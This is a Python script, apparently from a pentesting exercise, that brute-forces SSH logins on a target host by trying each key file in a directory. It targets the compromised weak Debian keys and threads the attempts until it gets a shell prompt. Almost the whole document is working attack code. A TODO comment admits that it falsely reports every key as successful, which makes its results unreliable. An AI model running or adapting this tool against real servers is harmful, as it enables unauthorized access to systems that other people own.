#TODO: Figure out why the child.expect always returns ret code 4, leading us to think every password is successful
#Script that checks all the weak debian keys from the recent vulnerability against a server
#If the server is using one of the compromised keys and doesn't lock you out for multiple attempts, it should work eventually
#But nobody should still be using these keys
#USAGE: python ./ssh-weak-debian-keys-check.py -H <target IP> -u <user to login as> -d </path/to/directory/with/SSH/keyfiles>

import pexpect
import optparse
import os
from threading import *

maxConnections=5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails =0

def connect(user, host, keyfile, release):
    global Stop
    global Fails
    try:
        perm_denied = 'Permission denied.*'
        ssh_newkey = 'Are you sure you want to continue.*'
        conn_closed = 'Connection closed by remote host.*'
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh ' + user + '@' +  host  + ' -i ' + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#' ])

        if ret ==2:
            print '[-] Adding Host to ~/.ssh/known_hosts'
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret ==3:
            print '[-] Connection Closed By Remote Host'
            Fails += 1
        elif ret>3:
            print '[+] Success we received ret code ' + str(ret) + ' from key ' +  str(keyfile)
            Stop = True
    finally:
        if release:
            connection_lock.release()
            
def main():
    parser = optparse.OptionParser('usage%prog ' +'-H <target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    parser.add_option('-d', dest='passDir', type='string', help='specify password directory')

    (options,args) = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user

    if host == None or passDir == None or user == None:
        print parser.usage
        exit(0)

    for filename in os.listdir(passDir):
        if Stop:
            print "[*] Exiting: Key Found"
            exit(0)
        if Fails > 5:
            print '[!] Exiting: Too many connections closed by remote host' + '\n[!] Adjust number of simultaneous threads'
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(passDir, filename)
        print '[-] Testing a key at ' + fullpath
        t = Thread(target=connect, args=(user, host,fullpath, True))
        child = t.start()



if __name__ == '__main__':
    main()


 

